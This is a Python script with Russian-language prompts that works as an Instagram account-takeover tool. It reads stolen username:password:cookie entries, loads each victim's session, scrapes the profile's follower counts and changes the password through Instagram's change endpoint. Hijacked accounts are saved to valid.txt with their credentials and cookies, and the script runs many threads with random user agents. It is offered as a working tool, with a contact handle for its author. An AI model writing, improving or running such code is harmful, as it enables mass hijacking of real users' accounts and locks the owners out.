import json
import threading
import loguru
import requests
import time
import random
from fake_useragent import UserAgent
from bs4 import BeautifulSoup as BS
import time


with open("accounts.txt", "r", encoding="utf-8") as file: data = file.read().split("\n")
with open("settings.json", "r", encoding="utf-8") as file: Settings = json.load(file)

class Instagram():
    def __init__(self):
        self.client = requests.session()
        self.userag = UserAgent()

    def html(self, html):
        with open("index.html", "w", encoding="utf-8") as file: file.write(str(html))

    def find(self):
        try:
            account = random.choice(data)

            evidence = account.split(":")
            cookie = account.split("[")[1].replace("]", "")

            username = evidence[0]
            password = evidence[1]

            return {
                "cookie" : cookie,
                "username" : username,
                "password" : password,
                "account" : account
            }

        except: pass

    def convert(self, cookie):
        try:
            cookies = cookie.split("}")
            session = {}
            try:
                for cookie in cookies:
                    name = cookie.split('"name":"')[1].split('"')[0]
                    value = cookie.split('value":"')[1].split('"')[0]
                    session[name] = value
            except IndexError: pass

            return session
        except: pass

    def profile(self, username):
        try:
            r = self.client.get(f"https://www.instagram.com/{username}/")
            soup = BS(r.text, "lxml")

            envidense = soup.find("meta", {"property" : "og:description"}).get("content")

            followers = envidense.split("подписчиков")[0]
            following = envidense.split(",")[1].split(" ")[1]
            posts = envidense.split(",")[2].split(" ")[1]

            return {
                "followers" : followers,
                "posts" : posts,
                "followings" : following
            }
        except IndexError:
            return False

        except:
            print("Неизвестная ошибка, отпишите кодеру @benefixx")

    def change(self, username, password, new_password):
        r = self.client.get("https://www.instagram.com/accounts/password/change/")
        csrf = r.text.split('"csrf_token":"')[1].split('"')[0]
        print(f"csrf: {csrf}")

        self.client.headers.update({
            "X-CSRFToken": csrf,
            "method": "POST",
            "path": "/accounts/password/change/",
            "scheme": "https",
            "accept": "*/*",
            "referer": "https://www.instagram.com/accounts/password/change/",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"
        })

        time.sleep(random.randint(2, 5))
        timer = str(time.time() // 1000).split(".")[0]

        data_change = {"enc_old_password": "#PWD_INSTAGRAM_BROWSER:0:1589682409:" + password,
                            "enc_new_password1": "#PWD_INSTAGRAM_BROWSER:0:1589682409:" + new_password,
                            "enc_new_password2": "#PWD_INSTAGRAM_BROWSER:0:1589682409:" + new_password}

        r = self.client.post("https://www.instagram.com/accounts/password/change/", data=data_change)

        if '{"status":"ok"}' in r.text:
            loguru.Logger.success("ok")
            return True

        elif "logged-in" in r.text:
            return "retry"

        else: return False

    def launch(self):
        while True:
            evidence = self.find()
            cookies = self.convert(evidence["cookie"])
            self.client.cookies.update(cookies)
            self.client.headers.update({

                'authority': 'www.instagram.com',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'upgrade-insecure-requests': '1',
                'user-agent': self.userag.random,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',

            })

            r = self.client.get("https://instagram.com")
            time.sleep(random.randint(1, 2))

            base = self.profile(evidence["username"])


            cookies = cookies
            username = evidence["username"]
            password = evidence["password"]
            followers = base["followers"]
            posts = base["posts"]
            following = base["followings"]

            if base == "False":
                data.remove(evidence["account"])

            check = self.change(username, password, Settings["password"])

            if check == True:

                loguru.logger.success(f"followers: {followers} | following: {following} | posts: {posts}")

                self.client.get("https://i.instagram.com")

                text = f"{username}:{password} | followers: {followers} | following: {following} | posts: {posts} | cookie: {requests.utils.dict_from_cookiejar(self.client.cookies)}\n"
                data.remove(evidence["account"])
                with open("valid.txt", "a", encoding="utf-8") as file:
                    file.write(text)

            elif check == False:
                print("Невалид")
                data.remove(evidence["account"])

            elif check == "retry":
                pass

def main():
    instagram = Instagram()
    ThreadChoice = int(input("Потоков: "))
    for i in range(0, ThreadChoice):
        threading.Thread(target=instagram.launch).start()

if __name__ == "__main__":
    main()
